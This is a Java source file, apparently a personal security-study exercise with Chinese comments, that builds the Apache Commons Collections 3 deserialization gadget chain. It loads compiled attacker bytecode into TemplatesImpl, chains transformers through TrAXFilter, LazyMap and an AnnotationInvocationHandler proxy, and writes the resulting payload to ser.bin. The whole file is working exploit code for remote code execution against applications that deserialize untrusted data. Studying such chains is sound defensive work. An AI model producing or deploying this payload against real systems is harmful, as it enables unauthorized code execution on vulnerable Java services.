package com.melll;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.transform.Templates;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

public class CC3 {
    public static void main(String[] args) throws Exception {
        TemplatesImpl templates = new TemplatesImpl();

        Class<TemplatesImpl> templatesClass = TemplatesImpl.class;

        Field nameField = templatesClass.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates,"Vshex");

        Field _bytecodesField = templatesClass.getDeclaredField("_bytecodes");
        _bytecodesField.setAccessible(true);
        byte[] code = Files.readAllBytes(Paths.get("E:\\Document\\Java安全\\CC\\CC3\\target\\classes\\com\\melll\\eval.class"));
        byte [][] codes =new byte[][]{code};
        _bytecodesField.set(templates,codes);
        //反序列化 readobject 自动赋值 _tfactory 不需要赋值
//        Field tfactory = templatesClass.getDeclaredField("_tfactory");
//        tfactory.setAccessible(true);
//        tfactory.set(templates,new TransformerFactoryImpl());

//        templates.newTransformer(); //直接调用
//--------------------------------- 调用链1
//        Transformer[] Transformers = new Transformer[]{
//                new ConstantTransformer(templates),
//                new InvokerTransformer("newTransformer", null,null)
//        };
//        ChainedTransformer chainedTransformer = new ChainedTransformer(Transformers);
//        chainedTransformer.transform("Vshex"); 直接调用
//--------------------------------- 调用链1
//--------------------------------- 调用链2
        Transformer[] Transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates}),
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(Transformers);
//        chainedTransformer.transform("Vshex");//直接调用
//--------------------------------- 调用链2
        //cc1 后半段
        HashMap<Object,Object> map = new HashMap<Object,Object>();
        Map lazymap = LazyMap.decorate(map, chainedTransformer);

        Class annotationInvocationHandlerClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor annotationInvocationHandlerConstructor = annotationInvocationHandlerClass.getDeclaredConstructor(Class.class, Map.class);
        annotationInvocationHandlerConstructor.setAccessible(true);
        InvocationHandler h = (InvocationHandler) annotationInvocationHandlerConstructor.newInstance(Override.class,lazymap);

        Map mapproxy  = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), new Class[]{Map.class}, h);

        Object obj = annotationInvocationHandlerConstructor.newInstance(Override.class,mapproxy);


        serialize(obj);
//        unsserialize("ser.bin");
    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(Files.newOutputStream(Paths.get("ser.bin")));
        oos.writeObject(obj);
    }
    public static Object unsserialize(String Filename) throws IOException,ClassNotFoundException{
        ObjectInputStream ois = new ObjectInputStream(Files.newInputStream(Paths.get(Filename)));
        return ois.readObject();

    }
}